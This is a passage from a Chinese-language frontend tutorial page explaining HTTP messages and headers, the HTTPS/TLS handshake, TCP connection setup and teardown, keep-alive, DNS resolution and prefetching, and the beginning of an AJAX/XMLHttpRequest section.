<li>安全性：是否修改服务器资源（仅 GET 是安全的）</li>
</ul>
<p><strong>HTTP 状态码</strong></p>
<table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">类别</th>
<th align="left">核心含义</th>
<th align="left">典型触发场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left">200</td>
<td align="left">成功 (2xx)</td>
<td align="left">OK - 请求成功处理</td>
<td align="left">页面正常加载、API返回有效数据</td>
</tr>
<tr>
<td align="left">301</td>
<td align="left">重定向 (3xx)</td>
<td align="left">Moved Permanently - 资源永久迁移（浏览器自动缓存新地址）</td>
<td align="left">网站域名变更、旧URL废弃（SEO权重转移）</td>
</tr>
<tr>
<td align="left">404</td>
<td align="left">客户端错误(4xx)</td>
<td align="left">Not Found - 请求资源不存在</td>
<td align="left">URL路径错误、静态资源被删除</td>
</tr>
<tr>
<td align="left">500</td>
<td align="left">服务器错误(5xx)</td>
<td align="left">Internal Server Error - 服务器内部处理失败</td>
<td align="left">后端代码异常、数据库连接故障</td>
</tr>
</tbody></table>
<h3 id="HTTP报文结构（请求行、请求头、请求体）"><a href="#HTTP报文结构（请求行、请求头、请求体）" class="headerlink" title="HTTP报文结构（请求行、请求头、请求体）"></a>HTTP报文结构（请求行、请求头、请求体）</h3><p><strong>请求报文结构</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">[请求行]
[请求头]
[空行]
[请求体]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>请求行（Request Line）</strong></p>
<ul>
<li>格式：<code>[方法] [URL路径] [协议版本]</code>（<code>GET /index.html HTTP/1.1</code>）</li>
<li>核心要素：<ul>
<li>方法：<code>GET/POST/PUT/DELETE</code>等</li>
<li>URL 路径：资源路径，不包含域名</li>
<li>协议版本：<code>HTTP/1.1</code> 或 <code>HTTP/2</code></li>
</ul>
</li>
</ul>
<p><strong>请求头（Request Headers）</strong></p>
<ul>
<li>格式：<code>Header-Name: value</code>（<code>Host: www.example.com</code>）</li>
<li>关键字段：<ul>
<li>HOST：目标域名（HTTP&#x2F;1.1 必需）</li>
<li>User-Agent：客户端标识</li>
<li>Content-type：请求媒体类型</li>
<li>Cookie：会话状态</li>
</ul>
</li>
</ul>
<p><strong>请求体（Request Body）</strong></p>
<ul>
<li>位置：空行之后</li>
<li>内容：<ul>
<li>GET 请求通常无请求体</li>
<li>POST&#x2F;PUT 请求包含数据</li>
</ul>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>格式依赖：由 <code>Content-Type</code> 请求头指定</li>
</ul>
<p><strong>响应报文结构</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">[状态行]
[响应头]
[空行]
[响应体]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>状态行（Status Line）</strong></p>
<ul>
<li>格式：<code>[协议版本] [状态码] [状态文本]</code>（<code>HTTP/1.1 200 OK</code>）</li>
</ul>
<p><strong>响应头（Response Headers）</strong></p>
<ul>
<li>格式：<code>Header-Name: value</code>（<code>Cache-Control: nocache</code>）</li>
<li>关键字段：<ul>
<li>Content-type：响应体类型（如 text&#x2F;html）</li>
<li>Cache-Control：缓存策略</li>
<li>Set-Cookie：会话状态</li>
</ul>
</li>
</ul>
<p><strong>响应体（Response Body）</strong></p>
<ul>
<li>内容：</li>
</ul>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"value"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="请求-响应头结构（Content-Type-Cache-Control-Authorization）"><a href="#请求-响应头结构（Content-Type-Cache-Control-Authorization）" class="headerlink" title="请求&#x2F;响应头结构（Content-Type&#x2F;Cache-Control&#x2F;Authorization）"></a>请求&#x2F;响应头结构（Content-Type&#x2F;Cache-Control&#x2F;Authorization）</h3><p><strong>HTTP 头部核心结构</strong></p>
<p>HTTP 头是键值对集合（不区分大小写），位于请求&#x2F;响应报文起始行之后，空行之前，格式如下：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Header-Name: value1, value2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>核心请求&#x2F;响应头详解</strong></p>
<p>（1）content-Type</p>
<ul>
<li>作用：设置请求&#x2F;响应主体的媒体类型（MIME 类型）和编码格式</li>
<li>请求头示例：Content-Type: application&#x2F;json; charset&#x3D;utf-8<ul>
<li>application&#x2F;json：JSON 格式数据</li>
<li>charset&#x3D;utf-8：字符编码</li>
</ul>
</li>
<li>响应头示例：Content-Type: text&#x2F;html; charset&#x3D;UTF-8</li>
<li>前端关键场景：<ul>
<li>提交表单时需设置：application&#x2F;x-www-form-urlencoded（默认）或multipart&#x2F;form-data（文件上传）</li>
<li>调用 API 时需与服务端协商：application&#x2F;json（RESTful API 规范）</li>
</ul>
</li>
</ul>
<p>（2）Cache-Control</p>
<ul>
<li>作用：控制资源的缓存机制（请求&#x2F;响应中均可使用），优先级高于 <code>Expires</code></li>
<li>常用指令：</li>
</ul>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">请求头用途</th>
<th align="left">响应头用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">max-age&#x3D;3600</td>
<td align="left">-</td>
<td align="left">资源有效期（秒）</td>
</tr>
<tr>
<td align="left">no-cache</td>
<td align="left">要求服务器验证缓存有效性</td>
<td align="left">允许缓存但每次需验证</td>
</tr>
<tr>
<td align="left">no-store</td>
<td align="left">禁止任何缓存</td>
<td align="left">禁止任何缓存</td>
</tr>
<tr>
<td align="left">public</td>
<td align="left">-</td>
<td align="left">允许所有环境缓存（CDN&#x2F;代理）</td>
</tr>
<tr>
<td align="left">private</td>
<td align="left">-</td>
<td align="left">仅允许浏览器缓存</td>
</tr>
</tbody></table>
<ul>
<li>前端优化实践：</li>
</ul>
<pre class="line-numbers language-text" data-language="text"><code class="language-text"># 静态资源长期缓存
Cache-Control: public, max-age=31536000, immutable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>（3）Authorization</p>
<ul>
<li>作用：在请求头中携带客户端身份凭证，用于访问受保护资源</li>
<li>典型格式：<code>Authorization: &lt;认证类型&gt; &lt;凭证&gt;</code><ul>
<li>Bearer Token（JWT标准）：<code>Authorization: Bearer eyJhbGci...</code></li>
<li>Basic Auth：<code>Authorization: Basic base64(username:password)</code></li>
</ul>
</li>
<li>安全要求：<ul>
<li>必须通过 HTTPS 传输（防止凭证泄露）</li>
<li>前端存储敏感凭证需使用 <code>HttpOnly Cookie</code> 或安全存储（Secure Storage）</li>
</ul>
</li>
</ul>
<h3 id="HTTPS加密原理（SSL-TLS握手、证书验证）"><a href="#HTTPS加密原理（SSL-TLS握手、证书验证）" class="headerlink" title="HTTPS加密原理（SSL&#x2F;TLS握手、证书验证）"></a>HTTPS加密原理（SSL&#x2F;TLS握手、证书验证）</h3><p><strong>核心原理</strong></p>
<p>本质是 HTTP + TLS&#x2F;SSL 加密层（传输层安全协议），通过混合加密体系保障安全</p>
<p><strong>TLS&#x2F;SSL 握手过程</strong></p>
<table>
<thead>
<tr>
<th align="left">步骤</th>
<th align="left">关键动作</th>
<th align="left">加密技术应用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ClientHello</td>
<td align="left">客户端发送：支持的 TLS 版本 + 加密套件列表 + 随机数 A</td>
<td align="left">-</td>
</tr>
<tr>
<td align="left">ServerHello</td>
<td align="left">服务器响应：选定的 TLS 版本和加密套件 + 随机数 B + 数字证书（含公钥）</td>
<td align="left">非对称加密基础</td>
</tr>
<tr>
<td align="left">证书验证</td>
<td align="left">客户端验证证书：颁发机构（CA）可信性 + 域名匹配 + 有效期 + 证书链完整性</td>
<td align="left">数字签名技术</td>
</tr>
<tr>
<td align="left">交换密钥</td>
<td align="left">客户端：生成预主密钥，使用公钥加密预主密钥并发送给服务器</td>
<td align="left">非对称加密（RSA&#x2F;ECC）</td>
</tr>
<tr>
<td align="left">生成会话密钥</td>
<td align="left">双方使用随机数 A&#x2F;B + 预主密钥计算会话密钥</td>
<td align="left">密钥派生函数</td>
</tr>
<tr>
<td align="left">加密通信就绪</td>
<td align="left">双方交换<code>Finished</code>消息验证密钥正确性，后续通信使用会话密钥对称加密</td>
<td align="left">对称加密</td>
</tr>
</tbody></table>
<p>流程图如下：</p>
<pre><code class="mermaid">sequenceDiagram
    participant Client
    participant Server
    Client-&gt;&gt;Server: ClientHello (TLS版本 + 加密套件 + 随机数A)
    Server-&gt;&gt;Client: ServerHello (加密套件 + 随机数B) + 证书
    Note right of Client: 证书验证 (CA链&#x2F;域名&#x2F;有效期)
    Client-&gt;&gt;Server: 加密的预主密钥 (用服务器公钥)
    Note left of Server: 生成会话密钥 (随机数A+B+预主密钥)
    Server-&gt;&gt;Client: [Finished]
    Client-&gt;&gt;Server: [Finished]
    Note over Client,Server: 后续通信使用会话密钥对称加密</code></pre>

<p><strong>证书验证机制</strong></p>
<table>
<thead>
<tr>
<th align="left">验证环节</th>
<th align="left">技术原理</th>
</tr>
</thead>
<tbody><tr>
<td align="left">证书链信任</td>
<td align="left">客户端预置根 CA 证书 -&gt; 验证中间 CA 签名 -&gt; 验证服务器证书签名</td>
</tr>
<tr>
<td align="left">域名检查</td>
<td align="left">检查服务器返回证书里的 subject alternative name（SAN） 或 common name（CN） 是否与访问域名一致</td>
</tr>
<tr>
<td align="left">吊销检查</td>
<td align="left">通过 OCSP （在线证书状态协议）或 CRL （证书吊销列表）验证证书有效性</td>
</tr>
</tbody></table>
<p><strong>混合加密优势</strong></p>
<table>
<thead>
<tr>
<th align="left">阶段</th>
<th align="left">技术</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">握手阶段</td>
<td align="left">非对称加密</td>
<td align="left">安全传输会话密钥（防窃听）</td>
</tr>
<tr>
<td align="left">数据传输阶段</td>
<td align="left">对称加密</td>
<td align="left">高性能加密业务数据（千倍于非对称）</td>
</tr>
</tbody></table>
<p><strong>前端关键影响</strong></p>
<ul>
<li>安全实践：<ul>
<li>必须使用 HTTPS 访问所有资源（避免混合内容警告）</li>
<li>使用 <code>Strict-Transport-Security</code> 头强制 HTTPS</li>
</ul>
</li>
<li>性能优化：<ul>
<li>启用 TLS 会话复用（session resumption），减少握手开销</li>
<li>使用 ECDHE 密钥交换（前向保密）</li>
</ul>
</li>
</ul>
<h2 id="1-2-TCP-UDP基础"><a href="#1-2-TCP-UDP基础" class="headerlink" title="1.2 TCP&#x2F;UDP基础"></a>1.2 TCP&#x2F;UDP基础</h2><h3 id="三次握手与四次挥手流程"><a href="#三次握手与四次挥手流程" class="headerlink" title="三次握手与四次挥手流程"></a>三次握手与四次挥手流程</h3><p><strong>三次握手（连接建立）</strong></p>
<p>流程图解：</p>
<pre><code class="mermaid">sequenceDiagram
    participant Client
    participant Server
    Note left of Client: CLOSED → SYN_SENT
    Client-&gt;&gt;Server: SYN&#x3D;1, seq&#x3D;x (随机序列号)
    Note right of Server: LISTEN → SYN_RCVD
    Server-&gt;&gt;Client: SYN&#x3D;1, ACK&#x3D;1, seq&#x3D;y, ack&#x3D;x+1
    Note left of Client: SYN_SENT → ESTABLISHED
    Client-&gt;&gt;Server: ACK&#x3D;1, seq&#x3D;x+1, ack&#x3D;y+1
    Note right of Server: SYN_RCVD → ESTABLISHED</code></pre>

<p>核心步骤：</p>
<ul>
<li>第一次握手<ul>
<li>客户端发送 SYN&#x3D;1（同步标志）和随机序列号 seq&#x3D;x</li>
<li>状态变化：客户端进入 SYN_SENT</li>
</ul>
</li>
<li>第二次握手<ul>
<li>服务器返回 SYN&#x3D;1 + ACK&#x3D;1（确认标志），携带自己的序列号 seq&#x3D;y 和确认号 ack&#x3D;x+1</li>
<li>状态变化：服务器进入 SYN_RCVD</li>
</ul>
</li>
<li>第三次握手<ul>
<li>客户端发送 ACK&#x3D;1，确认号 ack&#x3D;y+1</li>
<li>状态变化：双方进入 ESTABLISHED</li>
</ul>
</li>
</ul>
<p>设计目的：</p>
<ul>
<li>确认双方的收发能力正常</li>
<li>同步初始序列号（防历史链接混乱）</li>
</ul>
<p><strong>四次挥手（连接释放）</strong></p>
<p>流程图解：</p>
<pre><code class="mermaid">sequenceDiagram
    participant Client
    participant Server
    Note left of Client: ESTABLISHED → FIN_WAIT_1
    Client-&gt;&gt;Server: FIN&#x3D;1, seq&#x3D;u
    Note right of Server: ESTABLISHED → CLOSE_WAIT
    Server-&gt;&gt;Client: ACK&#x3D;1, ack&#x3D;u+1
    Note left of Client: FIN_WAIT_1 → FIN_WAIT_2
    Server-&gt;&gt;Client: FIN&#x3D;1, seq&#x3D;v, ack&#x3D;u+1
    Note right of Server: CLOSE_WAIT → LAST_ACK
    Client-&gt;&gt;Server: ACK&#x3D;1, ack&#x3D;v+1
    Note left of Client: FIN_WAIT_2 → TIME_WAIT (2MSL后CLOSED)
    Note right of Server: LAST_ACK → CLOSED</code></pre>

<p>核心步骤：</p>
<ul>
<li>第一次挥手<ul>
<li>主动方发送 FIN&#x3D;1（结束标志）和序列号 seq&#x3D;u</li>
<li>状态变化：主动方进入 FIN_WAIT_1</li>
</ul>
</li>
<li>第二次挥手<ul>
<li>被动方返回 ACK&#x3D;1 和确认号 ack&#x3D;u+1</li>
<li>状态变化：被动方进入 CLOSE_WAIT（半关闭状态）</li>
</ul>
</li>
<li>第三次挥手<ul>
<li>被动方发送自己的 FIN&#x3D;1 和序列号 seq&#x3D;v</li>
<li>状态变化：被动方进入 LAST_ACK</li>
</ul>
</li>
<li>第四次挥手<ul>
<li>主动方发送 ACK&#x3D;1 和确认号 ack&#x3D;v+1</li>
<li>状态变化：主动方进入 TIME_WAIT（等待2MSL后关闭）</li>
</ul>
</li>
</ul>
<p>关键机制：</p>
<ul>
<li>TIME_WAIT状态：<ul>
<li>持续2MSL（报文最大生存时间，通常1-4分钟）</li>
<li>目的：确保最后一个 ACK 到达 + 让网络中残留报文失效</li>
</ul>
</li>
<li>半关闭状态：被动方可在 CLOSE_WAIT 阶段继续发送数据</li>
</ul>
<p><strong>与 HTTP 协议的关系</strong></p>
<ul>
<li>HTTP&#x2F;1.1：三次握手后完成单个请求-响应，默认 Connection: keep-alive 复用 TCP 连接</li>
<li>连接开销：高频短连接场景（如HTTP&#x2F;1.0）会因反复握手&#x2F;挥手导致性能下降</li>
</ul>
<h3 id="连接复用（Keep-Alive）与队头阻塞问题"><a href="#连接复用（Keep-Alive）与队头阻塞问题" class="headerlink" title="连接复用（Keep-Alive）与队头阻塞问题"></a>连接复用（Keep-Alive）与队头阻塞问题</h3><p><strong>连接复用（Keep-Alive）</strong></p>
<p>定义：通过复用同一个 TCP 连接处理多个 HTTP 请求&#x2F;响应，避免重复的三次握手和四次挥手，降低延迟和资源消耗。</p>
<p>工作原理：</p>
<ul>
<li>HTTP&#x2F;1.1：默认启用Connection: keep-alive，允许复用连接。</li>
<li>HTTP头部控制：</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive  // 启用复用</span></span>
<span class="token header"><span class="token header-name keyword">Keep-Alive</span><span class="token punctuation">:</span> <span class="token header-value">timeout=5, max=100  // 空闲超时5秒，最多复用100次请求</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>优势：</p>
<ul>
<li>减少 TCP 握手&#x2F;挥手开销（节省1-2 RTT&#x2F;请求）</li>
<li>降低服务器和客户端资源占用（减少 Socket 创建和销毁）</li>
</ul>
<p>示例流程：</p>
<pre><code class="mermaid">sequenceDiagram
    participant Client
    participant Server
    Client-&gt;&gt;Server: GET &#x2F;page1 HTTP&#x2F;1.1 (Connection: keep-alive)
    Server-&gt;&gt;Client: HTTP&#x2F;1.1 200 OK (Connection: keep-alive)
    Client-&gt;&gt;Server: GET &#x2F;page2 HTTP&#x2F;1.1 (复用同一TCP连接)
    Server-&gt;&gt;Client: HTTP&#x2F;1.1 200 OK</code></pre>

<p><strong>队头阻塞（Head-of-Line Blocking）</strong></p>
<p>定义：当单个 TCP 连接中的前一个请求未完成时，后续请求必须等待，即使它们彼此独立。</p>
<p>两种类型：</p>
<ul>
<li>TCP 层队头阻塞<ul>
<li>原因：TCP 保证数据有序交付，丢失包会阻塞后续包的重传。</li>
<li>影响：即使HTTP&#x2F;2复用连接，仍受底层TCP限制。</li>
</ul>
</li>
<li>HTTP&#x2F;1.1层队头阻塞<ul>
<li>原因：HTTP&#x2F;1.1的管道化（pipelining）请求必须按顺序返回响应。</li>
<li>示例：</li>
</ul>
</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /resource1  // 慢请求
GET /resource2  // 被阻塞直到resource1完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>解决方案：</p>
<ul>
<li>HTTP&#x2F;2：引入多路复用（Multiplexing），通过二进制分帧层实现并行请求。</li>
<li>HTTP&#x2F;3：基于QUIC协议（UDP），彻底解决TCP层队头阻塞。</li>
</ul>
<p><strong>对比总结</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">连接复用（Keep-Alive）</th>
<th align="left">队头阻塞问题</th>
</tr>
</thead>
<tbody><tr>
<td align="left">作用层级</td>
<td align="left">HTTP&#x2F;1.1及以上</td>
<td align="left">TCP层 + HTTP&#x2F;1.1管道化</td>
</tr>
<tr>
<td align="left">主要优化</td>
<td align="left">减少握手开销</td>
<td align="left">需HTTP&#x2F;2或QUIC解决</td>
</tr>
<tr>
<td align="left">性能影响</td>
<td align="left">提升短连接场景性能</td>
<td align="left">高延迟环境下性能下降显著</td>
</tr>
</tbody></table>
<p><strong>前端优化实践</strong></p>
<ol>
<li>HTTP&#x2F;1.1优化：使用多个域名（分片）绕过浏览器对单域名连接数的限制（通常6-8个）</li>
<li>升级协议：优先使用HTTP&#x2F;2（多路复用）或HTTP&#x2F;3（QUIC）。</li>
<li>资源合并：减少请求数量（如CSS&#x2F;JS合并），降低队头阻塞影响。</li>
</ol>
<h2 id="1-3-DNS解析机制"><a href="#1-3-DNS解析机制" class="headerlink" title="1.3 DNS解析机制"></a>1.3 DNS解析机制</h2><h3 id="域名解析流程（递归查询-权威解析）"><a href="#域名解析流程（递归查询-权威解析）" class="headerlink" title="域名解析流程（递归查询&#x2F;权威解析）"></a>域名解析流程（递归查询&#x2F;权威解析）</h3><p><strong>核心流程步骤</strong></p>
<pre><code class="mermaid">sequenceDiagram
    participant User
    participant LocalDNS as 本地DNS&lt;br&gt;(递归解析器)
    participant RootDNS as 根DNS
    participant TLDNS as 顶级域DNS&lt;br&gt;(如.com)
    participant AuthDNS as 权威DNS&lt;br&gt;(如example.com)
    
    User-&gt;&gt;LocalDNS: 查询 www.example.com
    alt 缓存命中
        LocalDNS--&gt;&gt;User: 直接返回IP (缓存)
    else 递归查询
        LocalDNS-&gt;&gt;RootDNS: 请求 .com 的TLD地址
        RootDNS--&gt;&gt;LocalDNS: 返回 .com TLD地址
        LocalDNS-&gt;&gt;TLDNS: 请求 example.com 权威服务器
        TLDNS--&gt;&gt;LocalDNS: 返回 example.com NS记录
        LocalDNS-&gt;&gt;AuthDNS: 请求 www.example.com A记录
        AuthDNS--&gt;&gt;LocalDNS: 返回IP地址
        LocalDNS-&gt;&gt;User: 返回最终IP
    end</code></pre>

<p><strong>递归查询（Recursive Query）</strong></p>
<ul>
<li>发起者：客户端（浏览器&#x2F;操作系统） → 本地 DNS 服务器</li>
<li>特点：<ul>
<li>客户端只发送一次请求</li>
<li>本地 DNS 负责完整解析流程，最终返回IP或错误</li>
</ul>
</li>
<li>客户端要求：<code>dig +recursive www.example.com</code></li>
</ul>
<p><strong>权威解析（Authoritative Resolution）</strong></p>
<ul>
<li>执行者：权威 DNS 服务器（管理特定域名的 DNS 记录）</li>
<li>记录类型：</li>
</ul>
<table>
<thead>
<tr>
<th align="left">记录</th>
<th align="left">作用</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">A</td>
<td align="left">IPv4地址</td>
<td align="left"><a href="http://www.example.com/">www.example.com</a>. 300 IN A 192.0.2.1</td>
</tr>
<tr>
<td align="left">AAAA</td>
<td align="left">IPv6地址</td>
<td align="left">… IN AAAA 2001:db8::1</td>
</tr>
<tr>
<td align="left">NS</td>
<td align="left">指定域名的权威服务器</td>
<td align="left">example.com. IN NS ns1.example.com</td>
</tr>
<tr>
<td align="left">CNAME</td>
<td align="left">域名别名</td>
<td align="left">www IN CNAME example.com</td>
</tr>
</tbody></table>
<p><strong>迭代查询（Iterative Query - 实际执行方式）</strong></p>
<ul>
<li>发生位置：本地 DNS 服务器 → 根&#x2F;TLD&#x2F;权威DNS</li>
<li>流程特点:<ol>
<li>本地 DNS 查询根 DNS（全球13组）获取 TLD 地址</li>
<li>查询TLD DNS（如.com注册局）获取权威 DNS</li>
<li>查询权威 DNS 获取最终A&#x2F;AAAA记录</li>
</ol>
</li>
<li>响应类型：<ul>
<li>非权威应答：返回下级 DNS 地址（转发）</li>
<li>权威应答：直接返回 IP（最终结果）</li>
</ul>
</li>
</ul>
<p><strong>缓存机制</strong></p>
<ul>
<li>本地DNS缓存：<ul>
<li>根据 TTL（Time-To-Live）缓存记录（如300秒）</li>
<li>减少全球 DNS 查询压力</li>
</ul>
</li>
<li>浏览器&#x2F;OS缓存：<ul>
<li>ipconfig &#x2F;displaydns（Windows）查看缓存</li>
<li>缓存过期后重新触发递归查询</li>
</ul>
</li>
</ul>
<p><strong>前端性能影响</strong></p>
<ul>
<li>优化手段：<ul>
<li>减少域名数量（降低 DNS 查询次数）</li>
<li>使用<code>&lt;link rel=&quot;dns-prefetch&quot;&gt;</code>预解析关键域名</li>
</ul>
</li>
<li>安全机制：<ul>
<li>DNSSEC：防止 DNS 欺骗（数字签名验证）</li>
<li>DoH&#x2F;DoT：加密 DNS 查询（防止监听）</li>
</ul>
</li>
</ul>
<h3 id="DNS预取（dns-prefetch）与缓存优化"><a href="#DNS预取（dns-prefetch）与缓存优化" class="headerlink" title="DNS预取（dns-prefetch）与缓存优化"></a>DNS预取（dns-prefetch）与缓存优化</h3><p><strong>DNS预取（dns-prefetch）</strong></p>
<p>定义：浏览器提前解析后续页面可能访问的域名，将 DNS 查询与页面渲染并行执行，减少用户感知延迟。</p>
<p>实现方式：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 在HTML头部声明需预取的域名 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns-prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//cdn.example.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns-prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//api.example.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>工作流程：</p>
<ol>
<li>浏览器解析 HTML 时发现 dns-prefetch 标签</li>
<li>后台启动 DNS 查询（不阻塞页面渲染）</li>
<li>结果缓存至 DNS 缓存池</li>
<li>实际请求资源时直接使用缓存 IP</li>
</ol>
<p>性能影响：</p>
<ul>
<li>典型DNS查询耗时：50-200ms</li>
<li>预取后延迟：≈0ms（命中缓存时）</li>
<li>适用场景：<ul>
<li>第三方资源（CDN、分析脚本）</li>
<li>多域名架构下的跨域请求</li>
</ul>
</li>
</ul>
<p><strong>DNS缓存优化机制</strong></p>
<p>缓存层级：</p>
<table>
<thead>
<tr>
<th align="left">层级</th>
<th align="left">缓存位置</th>
<th align="left">存活时间</th>
<th align="left">控制方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">浏览器</td>
<td align="left">内存缓存</td>
<td align="left">会话级（关闭标签页失效）</td>
<td align="left">自动管理</td>
</tr>
<tr>
<td align="left">操作系统</td>
<td align="left">系统DNS缓存</td>
<td align="left">遵循TTL（默认分钟~小时）</td>
<td align="left">ipconfig &#x2F;flushdns</td>
</tr>
<tr>
<td align="left">本地DNS</td>
<td align="left">递归解析器缓存</td>
<td align="left">严格遵循TTL</td>
<td align="left">ISP&#x2F;管理员配置</td>
</tr>
</tbody></table>
<p>TTL（Time-To-Live）核心作用：</p>
<ul>
<li>DNS记录中设置的有效期（秒）：<code>example.com. 300 IN A 192.0.2.1 # TTL=300秒</code></li>
<li>平衡矛盾：<ul>
<li>高TTL（数小时）：减少查询次数，提升速度</li>
<li>低TTL（秒级）：快速更新DNS记录（如故障转移）</li>
</ul>
</li>
</ul>
<p>缓存刷新策略：</p>
<ul>
<li>前端无法直接控制，但可通过以下方式间接优化：<ul>
<li>关键域名使用稳定IP（避免频繁变更）</li>
<li>迁移到HTTP&#x2F;2+减少域名分片（降低DNS查询需求）</li>
</ul>
</li>
</ul>
<p><strong>联合优化实践</strong></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 步骤1: 预取关键域名 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns-prefetch<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//static.example.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!-- 步骤2: 预连接（DNS+TCP+TLS三合一优化） --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preconnect<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//api.example.com<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>preconnect：提前完成DNS+TCP握手+TLS协商（节省3-4次RTT）</p>
</blockquote>
<h1 id="二、网络请求技术"><a href="#二、网络请求技术" class="headerlink" title="二、网络请求技术"></a>二、网络请求技术</h1><h2 id="2-1-请求处理"><a href="#2-1-请求处理" class="headerlink" title="2.1 请求处理"></a>2.1 请求处理</h2><h3 id="AJAX原理与XMLHttpRequest对象"><a href="#AJAX原理与XMLHttpRequest对象" class="headerlink" title="AJAX原理与XMLHttpRequest对象"></a>AJAX原理与XMLHttpRequest对象</h3><p><strong>AJAX 核心原理</strong></p>
<p>定义：Asynchronous JavaScript and XML（异步JavaScript和XML），通过浏览器内置对象在不刷新页面的情况下与服务器交换数据并更新部分网页内容。</p>
<p>工作流程：</p>
<pre><code class="mermaid">sequenceDiagram
    participant User
    participant Browser
    participant Server
    User-&gt;&gt;Browser: 触发事件（点击&#x2F;滚动等）
    Browser-&gt;&gt;Server: 发送异步请求（XHR对象）
    Server-&gt;&gt;Browser: 返回数据（JSON&#x2F;XML&#x2F;Text）
    Browser-&gt;&gt;Browser: 解析数据 -&gt; 更新DOM
    Browser--&gt;&gt;User: 局部刷新页面</code></pre>

<p>关键特性：</p>
<ul>
<li>异步通信：不阻塞用户界面（对比传统表单提交）</li>
<li>数据格式：现代应用主要用JSON替代XML</li>
<li>同源策略：默认只能请求相同协议&#x2F;域名&#x2F;端口的资源（可通过CORS解除）</li>
</ul>
<p><strong>XMLHttpRequest（XHR）对象详解</strong></p>
<p>创建与初始化：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 创建实例</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'https://api.example.com/data'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 初始化（方法, URL, 异步）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>核心方法：</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.open(method, url, async)</td>
<td align="left">配置请求类型、地址、异步标志</td>
</tr>
<tr>
<td align="left">.send([body])</td>
